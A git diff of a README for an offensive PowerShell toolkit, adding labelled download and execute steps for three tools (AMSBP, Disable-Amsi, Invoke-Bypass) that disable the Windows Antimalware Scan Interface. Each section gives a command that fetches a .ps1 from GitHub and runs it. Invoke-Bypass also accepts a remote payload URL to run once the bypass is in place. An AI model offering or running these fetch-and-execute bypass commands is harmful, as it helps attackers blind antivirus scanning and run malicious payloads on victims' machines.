@@ -4,10 +4,14 @@
 |---|---|---|---|
 |AMSBP|Disable AMSI within current process|User Land|[Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/AMSBP.png)|
 
+<br />
+
+**downloadcmdLet:**
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/AMSBP.ps1" -OutFile "AMSBP.ps1"
 ```
 
+**execute:**
 ```powershell
 Import-Module -Name ".\AMSBP.ps1" -Force
 AMSBP
@@ -21,10 +25,14 @@ AMSBP
 |---|---|---|---|
 |Disable-Amsi|disable AMSI within current process using well<br />known techniques laid out in an unsignatured way</i></b>|User Land|3 bypass technics available (auto-sellection)<br />[Disable-Amsi cmdlet Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/Disable-Amsi.png)|
 
+<br />
+
+**downloadcmdLet:**
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/Disable-Amsi.ps1" -OutFile "Disable-Amsi.ps1"
 ```
 
+**execute:**
 ```powershell
 Import-Module -Name ".\Disable-Amsi.ps1" -Force
 Disable-Amsi -DontDisableBlockLogging "true"
@@ -38,6 +46,9 @@ Disable-Amsi -DontDisableBlockLogging "true"
 |---|---|---|---|
 |Invoke-Bypass|disable AMSI within current process + exec script through bypass?|User Land|3 bypass technics available (manual)|
 
+<br />
+
+**downloadcmdLet:**
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/Invoke-Bypass.ps1" -OutFile "Invoke-Bypass.ps1"
 ```
@@ -48,6 +59,7 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-B
 -payloadurl 'string' only accepts .ps1 .bat .vbs file formats
 ```
 
+**execute:**
 ```powershell
 Get-Help .\Invoke-Bypass.ps1 -full
 .\Invoke-Bypass.ps1 -list "technic"
